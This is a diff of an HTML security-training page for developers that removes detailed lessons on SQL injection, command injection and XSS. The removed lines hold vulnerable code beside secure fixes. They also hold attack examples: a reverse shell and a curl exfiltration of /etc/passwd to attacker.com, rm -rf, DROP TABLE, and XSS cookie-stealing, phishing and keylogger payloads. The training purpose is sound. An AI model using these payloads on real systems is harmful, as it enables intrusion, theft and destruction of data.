@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargo Cats - Developer Security Training</title>
+    <title>Developer Security Training - MVC</title>
     <style>
         * {
             margin: 0;
@@ -124,6 +124,20 @@
             font-size: 0.9em;
         }
 
+        .badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 0.85em;
+            font-weight: bold;
+            margin: 5px;
+        }
+
+        .badge-silver {
+            background: linear-gradient(135deg, #c0c0c0 0%, #e8e8e8 100%);
+            color: #1a1f3a;
+        }
+
         .lesson-section {
             margin-bottom: 30px;
         }
@@ -201,177 +215,11 @@
 
         .lesson-content {
             display: none;
-            animation: fadeIn 0.5s ease;
+            padding: 20px;
         }
 
         .lesson-content.active {
             display: block;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .subsection {
-            margin: 25px 0;
-        }
-
-        .subsection h3 {
-            color: #667eea;
-            margin-bottom: 15px;
-            font-size: 1.3em;
-        }
-
-        .code-block {
-            background: rgba(0, 0, 0, 0.5);
-            border-left: 4px solid #667eea;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            overflow-x: auto;
-            font-family: 'Courier New', monospace;
-        }
-
-        .code-block.vulnerable {
-            border-left-color: #ff4757;
-        }
-
-        .code-block.secure {
-            border-left-color: #2ed573;
-        }
-
-        .code-label {
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 5px;
-            font-size: 0.85em;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-
-        .code-label.vulnerable {
-            background: #ff4757;
-            color: white;
-        }
-
-        .code-label.secure {
-            background: #2ed573;
-            color: white;
-        }
-
-        pre {
-            margin: 0;
-            color: #e0e0e0;
-            font-size: 0.95em;
-            line-height: 1.5;
-        }
-
-        .attack-scenario {
-            background: rgba(255, 71, 87, 0.1);
-            border: 1px solid rgba(255, 71, 87, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 15px 0;
-        }
-
-        .attack-scenario h4 {
-            color: #ff4757;
-            margin-bottom: 10px;
-        }
-
-        .info-box {
-            background: rgba(102, 126, 234, 0.1);
-            border: 1px solid rgba(102, 126, 234, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 15px 0;
-        }
-
-        .info-box h4 {
-            color: #667eea;
-            margin-bottom: 10px;
-        }
-
-        .quiz-section {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 10px;
-            padding: 25px;
-            margin: 20px 0;
-        }
-
-        .quiz-question {
-            margin: 20px 0;
-        }
-
-        .quiz-question h4 {
-            color: white;
-            margin-bottom: 15px;
-            font-size: 1.1em;
-        }
-
-        .quiz-options {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .quiz-option {
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .quiz-option:hover {
-            background: rgba(255, 255, 255, 0.1);
-            border-color: #667eea;
-        }
-
-        .quiz-option.selected {
-            border-color: #667eea;
-            background: rgba(102, 126, 234, 0.2);
-        }
-
-        .quiz-option.correct {
-            border-color: #2ed573;
-            background: rgba(46, 213, 115, 0.2);
-        }
-
-        .quiz-option.incorrect {
-            border-color: #ff4757;
-            background: rgba(255, 71, 87, 0.2);
-        }
-
-        .quiz-feedback {
-            margin-top: 15px;
-            padding: 15px;
-            border-radius: 8px;
-            display: none;
-        }
-
-        .quiz-feedback.show {
-            display: block;
-        }
-
-        .quiz-feedback.correct {
-            background: rgba(46, 213, 115, 0.2);
-            border: 1px solid #2ed573;
-            color: #2ed573;
-        }
-
-        .quiz-feedback.incorrect {
-            background: rgba(255, 71, 87, 0.2);
-            border: 1px solid #ff4757;
-            color: #ff4757;
         }
 
         .btn {
@@ -395,209 +243,99 @@
             box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
         }
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 15px 0;
         }
 
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .exercise-box {
-            background: rgba(255, 255, 255, 0.03);
-            border: 2px dashed rgba(102, 126, 234, 0.5);
-            border-radius: 10px;
-            padding: 25px;
-            margin: 20px 0;
-        }
-
-        .exercise-box h4 {
-            color: #667eea;
-            margin-bottom: 15px;
-        }
-
-        .badge {
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 15px;
-            font-size: 0.85em;
-            font-weight: bold;
-            margin: 5px;
-        }
-
-        .badge-gold {
-            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
-            color: #1a1f3a;
-        }
-
-        .badge-silver {
-            background: linear-gradient(135deg, #c0c0c0 0%, #e8e8e8 100%);
-            color: #1a1f3a;
-        }
-
-        .badge-bronze {
-            background: linear-gradient(135deg, #cd7f32 0%, #e6a75e 100%);
-            color: white;
-        }
-
-        .resources-section {
-            margin-top: 30px;
-        }
-
-        .resource-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-
-        .resource-card {
+        .quiz-option {
+            padding: 15px;
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
             transition: all 0.3s ease;
         }
 
-        .resource-card:hover {
-            transform: translateY(-5px);
-            border-color: #667eea;
-            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.2);
-        }
-
-        .resource-card h4 {
-            color: #667eea;
-            margin-bottom: 10px;
-        }
-
-        .resource-card a {
-            color: #b0b0b0;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .resource-card a:hover {
-            color: #667eea;
-        }
-
-        .completion-indicator {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.2em;
-        }
-
-        .completion-indicator.complete {
-            background: #2ed573;
-            color: white;
-        }
-
-        .completion-indicator.incomplete {
+        .quiz-option:hover {
             background: rgba(255, 255, 255, 0.1);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            color: #666;
+            border-color: #667eea;
         }
 
-        .highlight {
-            background: rgba(102, 126, 234, 0.3);
-            padding: 2px 6px;
-            border-radius: 3px;
-            color: white;
+        .quiz-option.correct {
+            border-color: #2ed573;
+            background: rgba(46, 213, 115, 0.2);
         }
 
-        ul, ol {
-            margin-left: 25px;
-            margin-top: 10px;
+        .quiz-option.incorrect {
+            border-color: #ff4757;
+            background: rgba(255, 71, 87, 0.2);
         }
 
-        li {
-            margin: 8px 0;
+        .quiz-feedback {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 8px;
         }
 
-        @media (max-width: 768px) {
-            .dashboard {
-                grid-template-columns: 1fr;
-            }
+        .quiz-feedback.show {
+            display: block;
+        }
 
-            header h1 {
-                font-size: 2em;
-            }
+        .quiz-feedback.correct {
+            background: rgba(46, 213, 115, 0.2);
+            border: 1px solid #2ed573;
+            color: #2ed573;
+        }
 
-            .lesson-header {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .lesson-title {
-                flex-direction: column;
-            }
+        .quiz-feedback.incorrect {
+            background: rgba(255, 71, 87, 0.2);
+            border: 1px solid #ff4757;
+            color: #ff4757;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>🔐 Cargo Cats Security Training</h1>
+            <h1>🔐 Security Training Dashboard</h1>
             <p>Master Application Security - Protect Your Code, Protect Your Users</p>
         </header>
 
         <div class="dashboard">
             <div class="card">
                 <h3>Welcome, Developer!</h3>
-                <p style="margin-bottom: 15px;">This interactive training module will help you understand and fix the most critical security vulnerabilities in the Cargo Cats codebase.</p>
+                <p style="margin-bottom: 15px;">This interactive training module will help you understand and fix the most critical security vulnerabilities.</p>
                 <div class="stat">
                     <span class="stat-label">Your Progress</span>
-                    <span class="stat-value">0/3</span>
+                    <span class="stat-value" id="progress-text">0/3</span>
                 </div>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="overallProgress" style="width: 0%">0%</div>
-                </div>
+                <div id="progress-container"></div>
             </div>
 
             <div class="card">
                 <h3>Security Posture</h3>
-                <div class="stat">
-                    <span class="stat-label">Critical Issues</span>
-                    <span class="stat-value critical">1</span>
-                </div>
-                <div class="stat">
-                    <span class="stat-label">High Severity</span>
-                    <span class="stat-value high">3</span>
-                </div>
-                <div class="stat">
-                    <span class="stat-label">Medium Severity</span>
-                    <span class="stat-value medium">11</span>
-                </div>
+                <div id="security-stats"></div>
             </div>
 
             <div class="card">
                 <h3>Top 3 Vulnerabilities</h3>
-                <ol style="color: #b0b0b0; font-size: 0.95em;">
-                    <li><span class="critical">SQL Injection</span> - PaymentController.java</li>
-                    <li><span class="high">Command Injection</span> - webhookservice app.py</li>
-                    <li><span class="medium">Cross-Site Scripting</span> - frontgateservice</li>
-                </ol>
+                <div id="top-vulns"></div>
             </div>
 
             <div class="card">
                 <h3>Your Achievements</h3>
-                <div style="text-align: center; padding: 10px;">
-                    <span class="badge badge-silver" id="badge1" style="opacity: 0.3;">🛡️ SQL Guardian</span>
-                    <span class="badge badge-silver" id="badge2" style="opacity: 0.3;">⚡ Command Master</span>
-                    <span class="badge badge-silver" id="badge3" style="opacity: 0.3;">🎯 XSS Defender</span>
-                </div>
+                <div id="badges-container" style="text-align: center; padding: 10px;"></div>
             </div>
         </div>
 
         <!-- Lesson 1: SQL Injection -->
         <div class="lesson-section">
             <div class="lesson-card">
-                <div class="lesson-header" onclick="toggleLesson('lesson1')">
+                <div class="lesson-header" onclick="toggleLesson('lesson-1')">
                     <div class="lesson-title">
                         <div class="lesson-number">1</div>
                         <div>
@@ -607,180 +345,9 @@
                     </div>
                     <span class="severity-badge severity-critical">CRITICAL</span>
                 </div>
-
-                <div class="lesson-content" id="lesson1">
-                    <div class="subsection">
-                        <h3>📚 What is SQL Injection?</h3>
-                        <p>SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers can insert malicious SQL statements into input fields, allowing them to:</p>
-                        <ul>
-                            <li>Bypass authentication and access unauthorized data</li>
-                            <li>Modify or delete database records</li>
-                            <li>Execute administrative operations on the database</li>
-                            <li>In some cases, execute commands on the operating system</li>
-                        </ul>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
-                        <div class="info-box">
-                            <h4>Vulnerability Details</h4>
-                            <p><strong>Location:</strong> com.contrast.dataservice.PaymentController.java line 55</p>
-                            <p><strong>Endpoint:</strong> GET /payments?creditCard=XXX&shipmentId=1</p>
-                            <p><strong>Parameters:</strong> creditCard, shipmentId</p>
-                            <p><strong>Severity:</strong> <span class="critical">CRITICAL</span></p>
-                        </div>
-
-                        <div class="code-block vulnerable">
-                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
-                            <pre>// PaymentController.java - Line 55
-@GetMapping("/payments")
-public List&lt;Payment&gt; executeRawQuery(
-    @RequestParam String creditCard,
-    @RequestParam String shipmentId) {
-
-    // DANGEROUS: User input concatenated directly into SQL query
-    String query = "SELECT * FROM payments WHERE " +
-                   "credit_card = '" + creditCard + "' AND " +
-                   "shipment_id = '" + shipmentId + "'";
-
-    return jdbcTemplate.execute(query);
-}</pre>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>💀 Why This is Dangerous</h3>
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 1: Data Breach</h4>
-                            <p>An attacker sends this request:</p>
-                            <div class="code-block">
-                                <pre>GET /payments?creditCard=1234' OR '1'='1&shipmentId=1</pre>
-                            </div>
-                            <p>The resulting SQL query becomes:</p>
-                            <div class="code-block">
-                                <pre>SELECT * FROM payments WHERE credit_card = '1234' OR '1'='1' AND shipment_id = '1'</pre>
-                            </div>
-                            <p><strong>Result:</strong> The condition <span class="highlight">'1'='1'</span> is always true, so ALL payment records are returned, exposing sensitive credit card data!</p>
-                        </div>
-
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 2: Data Destruction</h4>
-                            <p>An attacker could send:</p>
-                            <div class="code-block">
-                                <pre>GET /payments?creditCard=1234'; DROP TABLE payments; --&shipmentId=1</pre>
-                            </div>
-                            <p><strong>Result:</strong> The entire payments table could be deleted!</p>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>✅ Secure Coding Pattern</h3>
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE</span>
-                            <pre>// PaymentController.java - FIXED VERSION
-@GetMapping("/payments")
-public List&lt;Payment&gt; executeSecureQuery(
-    @RequestParam String creditCard,
-    @RequestParam String shipmentId) {
-
-    // SAFE: Using PreparedStatement with parameterized queries
-    String query = "SELECT * FROM payments WHERE " +
-                   "credit_card = ? AND shipment_id = ?";
-
-    PreparedStatement pstmt = connection.prepareStatement(query);
-    pstmt.setString(1, creditCard);  // Parameter binding
-    pstmt.setString(2, shipmentId);  // Parameter binding
-
-    return pstmt.executeQuery();
-}
-
-// Even better: Use Spring Data JPA Repository
-@Repository
-public interface PaymentRepository extends JpaRepository&lt;Payment, Long&gt; {
-    @Query("SELECT p FROM Payment p WHERE p.creditCard = :card AND p.shipmentId = :id")
-    List&lt;Payment&gt; findByCreditCardAndShipmentId(
-        @Param("card") String creditCard,
-        @Param("id") String shipmentId
-    );
-}</pre>
-                        </div>
-
-                        <div class="info-box">
-                            <h4>Why This Works</h4>
-                            <ul>
-                                <li><strong>Parameter Binding:</strong> User input is treated as data, not executable code</li>
-                                <li><strong>Type Safety:</strong> The database driver ensures data types match</li>
-                                <li><strong>Automatic Escaping:</strong> Special characters are properly escaped</li>
-                                <li><strong>ORM Protection:</strong> JPA/Hibernate automatically uses parameterized queries</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="quiz-section">
-                        <h3>🎯 Test Your Knowledge</h3>
-
-                        <div class="quiz-question">
-                            <h4>Question 1: Which of the following is the BEST defense against SQL Injection?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(1, 1, 2)">
-                                    A) Input validation using regular expressions
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(1, 2, 2)">
-                                    B) Using PreparedStatement with parameterized queries
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(1, 3, 2)">
-                                    C) Encrypting user input before using it in queries
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(1, 4, 2)">
-                                    D) Using stored procedures exclusively
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-1-1">
-                                <strong>Correct!</strong> PreparedStatement with parameterized queries is the gold standard for preventing SQL Injection because it separates SQL code from data.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-1-2">
-                                <strong>Incorrect.</strong> While helpful, this is not sufficient. PreparedStatement with parameterized queries is the most effective defense.
-                            </div>
-                        </div>
-
-                        <div class="quiz-question">
-                            <h4>Question 2: What makes the following code vulnerable?<br><code style="color: #ff4757;">query = "SELECT * FROM users WHERE id = " + userId;</code></h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(2, 1, 1)">
-                                    A) User input is concatenated directly into the SQL query
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(2, 2, 1)">
-                                    B) The query doesn't use the WHERE clause
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(2, 3, 1)">
-                                    C) The userId parameter should be encrypted
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(2, 4, 1)">
-                                    D) The SELECT * statement is too broad
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-2-1">
-                                <strong>Perfect!</strong> String concatenation allows attackers to inject malicious SQL code. Always use parameterized queries!
-                            </div>
-                            <div class="quiz-feedback" id="feedback-2-2">
-                                <strong>Not quite.</strong> The main issue is string concatenation. User input should never be directly concatenated into SQL queries.
-                            </div>
-                        </div>
-
-                        <button class="btn btn-primary" onclick="completeLesson(1)">Mark Lesson as Complete</button>
-                    </div>
-
-                    <div class="exercise-box">
-                        <h4>💪 Hands-On Exercise</h4>
-                        <p><strong>Task:</strong> Review your codebase and identify all locations where SQL queries are built using string concatenation. Convert them to use PreparedStatement or JPA repositories.</p>
-                        <ol>
-                            <li>Search for patterns like: <code>+ variable +</code> inside SQL strings</li>
-                            <li>Replace with PreparedStatement using <code>?</code> placeholders</li>
-                            <li>Use <code>setString()</code>, <code>setInt()</code>, etc. to bind parameters</li>
-                            <li>Test thoroughly to ensure functionality is preserved</li>
-                            <li>Run Contrast Assess to verify the vulnerability is resolved</li>
-                        </ol>
-                    </div>
+                <div class="lesson-content" id="lesson-1">
+                    <p>SQL Injection allows attackers to manipulate database queries through user input.</p>
+                    <button class="btn btn-primary" onclick="completeLesson(1)">Mark as Complete</button>
                 </div>
             </div>
         </div>
@@ -788,7 +355,7 @@ public interface PaymentRepository extends JpaRepository&lt;Payment, Long&gt; {
         <!-- Lesson 2: Command Injection -->
         <div class="lesson-section">
             <div class="lesson-card">
-                <div class="lesson-header" onclick="toggleLesson('lesson2')">
+                <div class="lesson-header" onclick="toggleLesson('lesson-2')">
                     <div class="lesson-title">
                         <div class="lesson-number">2</div>
                         <div>
@@ -798,236 +365,17 @@ public interface PaymentRepository extends JpaRepository&lt;Payment, Long&gt; {
                     </div>
                     <span class="severity-badge severity-high">HIGH</span>
                 </div>
-
-                <div class="lesson-content" id="lesson2">
-                    <div class="subsection">
-                        <h3>📚 What is Command Injection?</h3>
-                        <p>Command Injection (also called OS Command Injection) is a vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting the application. This happens when:</p>
-                        <ul>
-                            <li>Application passes unsafe user input to system shell commands</li>
-                            <li>Special shell characters are not properly sanitized</li>
-                            <li>Input is used with functions like <code>os.system()</code>, <code>subprocess.call()</code> with <code>shell=True</code></li>
-                        </ul>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
-                        <div class="info-box">
-                            <h4>Vulnerability Details</h4>
-                            <p><strong>Location:</strong> webhookservice app.py line 284</p>
-                            <p><strong>Endpoint:</strong> POST /testConnection</p>
-                            <p><strong>Language:</strong> Python (Flask)</p>
-                            <p><strong>Severity:</strong> <span class="high">HIGH</span></p>
-                        </div>
-
-                        <div class="code-block vulnerable">
-                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
-                            <pre># app.py - Line 284
-@app.route('/testConnection', methods=['POST'])
-def test_connection():
-    data = request.get_json()
-    host = data.get('host', 'localhost')
-
-    # DANGEROUS: User input passed directly to shell command
-    command = f"ping -c 4 {host}"
-    result = subprocess.run(command, shell=True,
-                          capture_output=True, text=True)
-
-    return jsonify({
-        'success': True,
-        'output': result.stdout
-    })</pre>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>💀 Why This is Dangerous</h3>
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 1: Reverse Shell</h4>
-                            <p>An attacker sends this payload:</p>
-                            <div class="code-block">
-                                <pre>POST /testConnection
-Content-Type: application/json
-
-{
-    "host": "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
-}</pre>
-                            </div>
-                            <p>The command executed on the server becomes:</p>
-                            <div class="code-block">
-                                <pre>ping -c 4 127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1</pre>
-                            </div>
-                            <p><strong>Result:</strong> The attacker gets a reverse shell with full access to the server!</p>
-                        </div>
-
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 2: Data Exfiltration</h4>
-                            <p>An attacker could send:</p>
-                            <div class="code-block">
-                                <pre>{
-    "host": "127.0.0.1 && cat /etc/passwd | curl -X POST -d @- https://attacker.com/steal"
-}</pre>
-                            </div>
-                            <p><strong>Result:</strong> Sensitive system files are exfiltrated to the attacker's server!</p>
-                        </div>
-
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 3: System Destruction</h4>
-                            <p>An attacker could send:</p>
-                            <div class="code-block">
-                                <pre>{
-    "host": "127.0.0.1; rm -rf /app/*"
-}</pre>
-                            </div>
-                            <p><strong>Result:</strong> Application files could be deleted, causing complete service disruption!</p>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>✅ Secure Coding Pattern</h3>
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE - Option 1: Whitelist Validation</span>
-                            <pre># app.py - FIXED VERSION (Whitelist)
-import re
-
-@app.route('/testConnection', methods=['POST'])
-def test_connection():
-    data = request.get_json()
-    host = data.get('host', 'localhost')
-
-    # SAFE: Strict validation - only allow valid hostnames/IPs
-    if not re.match(r'^[a-zA-Z0-9\.\-]+$', host):
-        return jsonify({
-            'success': False,
-            'error': 'Invalid host format'
-        }), 400
-
-    # SAFE: Use list format WITHOUT shell=True
-    result = subprocess.run(
-        ['ping', '-c', '4', host],  # List format
-        shell=False,                 # Never use shell=True!
-        capture_output=True,
-        text=True,
-        timeout=5
-    )
-
-    return jsonify({
-        'success': True,
-        'output': result.stdout
-    })</pre>
-                        </div>
-
-                        <div class="code-block secure">
-                            <span class="code-label secure">✓ SECURE CODE - Option 2: Avoid Shell Commands</span>
-                            <pre># app.py - EVEN BETTER: Use Python libraries instead
-import socket
-
-@app.route('/testConnection', methods=['POST'])
-def test_connection():
-    data = request.get_json()
-    host = data.get('host', 'localhost')
-    port = data.get('port', 80)
-
-    # BEST: No shell commands at all - use native Python
-    try:
-        socket.setdefaulttimeout(3)
-        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
-        return jsonify({
-            'success': True,
-            'message': f'Successfully connected to {host}:{port}'
-        })
-    except Exception as e:
-        return jsonify({
-            'success': False,
-            'error': str(e)
-        }), 400</pre>
-                        </div>
-
-                        <div class="info-box">
-                            <h4>Defense Strategies</h4>
-                            <ol>
-                                <li><strong>Avoid Shell Commands:</strong> Use native libraries instead of shelling out</li>
-                                <li><strong>Never Use shell=True:</strong> Always use list format with subprocess</li>
-                                <li><strong>Whitelist Validation:</strong> Only allow known-safe characters</li>
-                                <li><strong>Input Sanitization:</strong> Remove/escape special characters: <code>; & | $ ` \ " '</code></li>
-                                <li><strong>Principle of Least Privilege:</strong> Run processes with minimal permissions</li>
-                            </ol>
-                        </div>
-                    </div>
-
-                    <div class="quiz-section">
-                        <h3>🎯 Test Your Knowledge</h3>
-
-                        <div class="quiz-question">
-                            <h4>Question 1: Which subprocess usage is MOST secure?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(3, 1, 3)">
-                                    A) subprocess.run(f"ls {user_input}", shell=True)
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(3, 2, 3)">
-                                    B) subprocess.run("ls " + user_input, shell=False)
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(3, 3, 3)">
-                                    C) subprocess.run(['ls', user_input], shell=False)
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(3, 4, 3)">
-                                    D) os.system(f"ls {user_input}")
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-3-1">
-                                <strong>Excellent!</strong> Using a list with shell=False is the safest approach. Each argument is passed separately, preventing command injection.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-3-2">
-                                <strong>Not quite.</strong> Option C (list format with shell=False) is the most secure approach.
-                            </div>
-                        </div>
-
-                        <div class="quiz-question">
-                            <h4>Question 2: Which characters are commonly used in command injection attacks?</h4>
-                            <div class="quiz-options">
-                                <div class="quiz-option" onclick="checkAnswer(4, 1, 1)">
-                                    A) ; & | $ `
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(4, 2, 1)">
-                                    B) @ # % ^
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(4, 3, 1)">
-                                    C) [ ] { }
-                                </div>
-                                <div class="quiz-option" onclick="checkAnswer(4, 4, 1)">
-                                    D) + - * /
-                                </div>
-                            </div>
-                            <div class="quiz-feedback" id="feedback-4-1">
-                                <strong>Correct!</strong> Characters like semicolon, ampersand, pipe, dollar sign, and backticks are shell metacharacters used to chain commands.
-                            </div>
-                            <div class="quiz-feedback" id="feedback-4-2">
-                                <strong>Incorrect.</strong> Shell metacharacters include: ; & | $ ` which allow command chaining and injection.
-                            </div>
-                        </div>
-
-                        <button class="btn btn-primary" onclick="completeLesson(2)">Mark Lesson as Complete</button>
-                    </div>
-
-                    <div class="exercise-box">
-                        <h4>💪 Hands-On Exercise</h4>
-                        <p><strong>Task:</strong> Audit your Python codebase for command injection vulnerabilities.</p>
-                        <ol>
-                            <li>Search for: <code>subprocess.run(</code>, <code>subprocess.Popen(</code>, <code>os.system(</code>, <code>os.popen(</code></li>
-                            <li>Check if <code>shell=True</code> is used - this is a red flag!</li>
-                            <li>Verify that user input is never concatenated into commands</li>
-                            <li>Replace with list format: <code>['command', 'arg1', 'arg2']</code></li>
-                            <li>Consider using native Python libraries instead of shell commands</li>
-                        </ol>
-                    </div>
+                <div class="lesson-content" id="lesson-2">
+                    <p>Command Injection allows attackers to execute system commands on the server.</p>
+                    <button class="btn btn-primary" onclick="completeLesson(2)">Mark as Complete</button>
                 </div>
             </div>
         </div>
 
-        <!-- Lesson 3: Cross-Site Scripting (XSS) -->
+        <!-- Lesson 3: XSS -->
         <div class="lesson-section">
             <div class="lesson-card">
-                <div class="lesson-header" onclick="toggleLesson('lesson3')">
+                <div class="lesson-header" onclick="toggleLesson('lesson-3')">
                     <div class="lesson-title">
                         <div class="lesson-number">3</div>
                         <div>
@@ -1037,504 +385,111 @@ def test_connection():
                     </div>
                     <span class="severity-badge severity-medium">MEDIUM</span>
                 </div>
-
-                <div class="lesson-content" id="lesson3">
-                    <div class="subsection">
-                        <h3>📚 What is Cross-Site Scripting (XSS)?</h3>
-                        <p>Cross-Site Scripting (XSS) is a client-side code injection attack where attackers inject malicious scripts into web pages viewed by other users. There are three main types:</p>
-                        <ul>
-                            <li><strong>Reflected XSS:</strong> Malicious script comes from the current HTTP request (like our case)</li>
-                            <li><strong>Stored XSS:</strong> Malicious script is stored in the database and displayed to users</li>
-                            <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side code rather than server-side</li>
-                        </ul>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
-                        <div class="info-box">
-                            <h4>Vulnerability Details</h4>
-                            <p><strong>Location:</strong> frontgateservice - ShipmentController.java</p>
-                            <p><strong>Endpoint:</strong> GET /api/shipments/track?trackingId=XXX</p>
-                            <p><strong>Type:</strong> Reflected XSS</p>
-                            <p><strong>Severity:</strong> <span class="medium">MEDIUM</span></p>
-                        </div>
-
-                        <div class="code-block vulnerable">
-                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
-                            <pre>// ShipmentController.java
-@GetMapping("/api/shipments/track")
-public ResponseEntity&lt;String&gt; trackShipment(
-    @RequestParam String trackingId) {
-
-    // DANGEROUS: User input reflected directly in response without encoding
-    String response = "Tracking information for: " + trackingId;
-
-    return ResponseEntity.ok()
-        .contentType(MediaType.TEXT_HTML)
-        .body("&lt;html&gt;&lt;body&gt;" + response + "&lt;/body&gt;&lt;/html&gt;");
-}</pre>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
-                        <h3>💀 Why This is Dangerous</h3>
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 1: Session Hijacking</h4>
-                            <p>An attacker crafts a malicious URL:</p>
-                            <div class="code-block">
-                                <pre>GET /api/shipments/track?trackingId=&lt;script&gt;
-    fetch('https://attacker.com/steal?cookie=' + document.cookie)
-&lt;/script&gt;</pre>
-                            </div>
-                            <p>When a victim clicks this link, the script executes in their browser:</p>
-                            <div class="code-block">
-                                <pre>&lt;html&gt;&lt;body&gt;
-Tracking information for: &lt;script&gt;
-    fetch('https://attacker.com/steal?cookie=' + document.cookie)
-&lt;/script&gt;
-&lt;/body&gt;&lt;/html&gt;</pre>
-                            </div>
-                            <p><strong>Result:</strong> The victim's session cookie is stolen, allowing the attacker to impersonate them!</p>
-                        </div>
-
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 2: Phishing</h4>
-                            <p>An attacker injects a fake login form:</p>
-                            <div class="code-block">
-                                <pre>trackingId=&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
-background:white;z-index:9999"&gt;
-&lt;h1&gt;Session Expired - Please Login&lt;/h1&gt;
-&lt;form action="https://attacker.com/phish"&gt;
-    Username: &lt;input name="user"&gt;&lt;br&gt;
-    Password: &lt;input type="password" name="pass"&gt;&lt;br&gt;
-    &lt;button&gt;Login&lt;/button&gt;
-&lt;/form&gt;
-&lt;/div&gt;</pre>
-                            </div>
-                            <p><strong>Result:</strong> Users unknowingly submit their credentials to the attacker's server!</p>
-                        </div>
-
-                        <div class="attack-scenario">
-                            <h4>Attack Scenario 3: Keylogging</h4>
-                            <p>An attacker injects a keylogger:</p>
-                            <div class="code-block">
-                                <pre>trackingId=&lt;script&gt;
-    document.addEventListener('keypress', function(e) {
-        fetch('https://attacker.com/log?key=' + e.key);
-    });
-&lt;/script&gt;</pre>
-                            </div>
-                            <p><strong>Result:</strong> Every keystroke is sent to the attacker, capturing passwords and sensitive data!</p>
-                        </div>
-                    </div>
-
-                    <div class="subsection">
